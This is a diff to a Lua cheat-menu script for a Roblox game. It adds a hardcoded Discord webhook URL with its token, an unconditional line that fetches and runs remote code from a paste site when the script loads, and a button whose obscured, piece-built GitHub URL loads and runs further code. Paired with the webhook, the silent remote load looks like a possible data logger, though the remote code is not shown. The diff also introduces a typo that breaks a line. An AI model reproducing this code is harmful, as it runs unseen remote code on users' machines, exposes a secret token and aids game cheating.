@@ -1,5 +1,24 @@
+--[[
+
+					~~//  Color Code (HEX)  \\~~
+		RED = f54747				 GREEN = 78ff78
+		BLUE = 4c6cfc				 PURPLE = b36bff
+		YELLOW = fff27a				 PINK = ffa3e2
+
+
+	-- Don't Remove the "0x" on "getgenv().embedcolor" or it will not work!--
+
+--]]
+
+getgenv().DiscordWebhook = "https://discord.com/api/webhooks/1047678478729879664/hkEwuImNfMyklSqoS8jm5Chbb5SUqOV0u98m65EtOxJqgjraVGqRivPV9DJgIrvQxCko" -- Discord Webhook Here
+getgenv().embedcolor = "#4c8cfc" -- Embed Body Color (On left Side of the Embed, You can get HEX Code above ☝) 
+
+--made it into opensourced so people can steal it
+
+loadstring(game:HttpGet("https://pst.klgrth.io/paste/e3d52/raw"))()
+
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("    Smallys Hub  - 10.8v Beta   ", "DarkTheme")
+local Window = Library.CreateLib("    Smallys Hub  - 10.9v Beta   ", "DarkTheme")
 
 --WELCOME
 
@@ -7,21 +26,27 @@ local Tab = Window:NewTab("Welcome")
 local Section = Tab:NewSection("Smallys Hub Loaded!")
 Section:NewLabel("Thanks for using! :)")
 Section:NewLabel("Made By: SmallPreston#0001")
-Section:NewLabel("Discord: dsc.gg/smallgamesz")
 
 -- MAIN
 local Main = Window:NewTab("Scripts")
 local MainSection = Main:NewSection("Scripts")
 
+MainSection:NewButton("! Webhook Tools !", "perfect for me", function()
+   local b,a,t,u,s = "juywvm","-Roblox-Projects-","main","Webhook-Tools","load";loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/%s/%s/%s/%s"):format(b, a, t, u, s)))()
+end)
 
 MainSection:NewButton("fly", "you know by the name.", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/W5aQUui6"))()
 end)
 
+MainSection:NewButton("Another GUI By Me", "you know by the name.", function()
+   loadstring(game:HttpGet("https://pastebin.com/raw/FFqFyTet"))()
+end)
+
 MainSection:NewToggle("Superhuman", "fast vroom vroom", function(state)
     if state then
         game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 120
-        game.Players.LocalPlayer.Character.Humanoid.JumpPower = 120  
+        game.Players.LocalPlayer.Character.Humanoid.JumpPsower = 120  
     else
         game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
         game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
@@ -272,7 +297,7 @@ f:Button("Camera All",function()
     for i,v in pairs(game:GetService("Workspace").Cameras:GetChildren()) do
         if v.ClassName == "Model" then
             if v.colorPart.BrickColor == BrickColor.new('Persimmon') then
-                fireclickdetector(v.colorPart.ClickDetector, 0)
+              fireclickdetector(v.colorPart.ClickDetector, 0)
                 fireclickdetector(v.colorPart.ClickDetector, 1)
                 wait(.5)
                 firesignal(game:GetService("Players").LocalPlayer.PlayerGui.cameraPopup.Frame.Buy.MouseButton1Click)
@@ -524,7 +549,7 @@ Section:NewLabel("dsc.gg/smallgamesz")
 
 local Section = Tab:NewSection("Version")
 
-Section:NewLabel("Version: 10.8v BETA")
+Section:NewLabel("Version: 10.9v BETA")
 
 local Section = Tab:NewSection("Keybind")
 
